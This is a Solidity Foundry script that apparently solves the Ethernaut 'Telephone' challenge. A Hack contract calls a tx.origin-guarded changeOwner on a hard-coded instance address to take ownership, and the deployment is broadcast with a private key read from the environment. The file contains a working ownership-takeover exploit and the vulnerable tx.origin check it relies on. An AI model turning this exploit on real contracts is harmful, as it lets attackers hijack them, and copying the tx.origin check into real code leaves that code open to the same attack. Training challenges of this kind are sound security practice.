// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";


contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Hack {
    Telephone instance = Telephone(0xdcf7DA54Cf2493fb26A7DCe862e9466CEcC30c6C);

    constructor() {
        instance.changeOwner(msg.sender);
    }

}

contract CounterScript is Script {
    address me = 0xB9f16b5a5D773be3Ec4A383dbc7316a515430605;

    function setUp() public {

    }

    function run() public {
        
        uint pk = vm.envUint("PK");

        address acc = vm.addr(pk);

        console.log(acc);

        vm.startBroadcast(pk);
        new Hack();
        vm.stopBroadcast();
    }

}
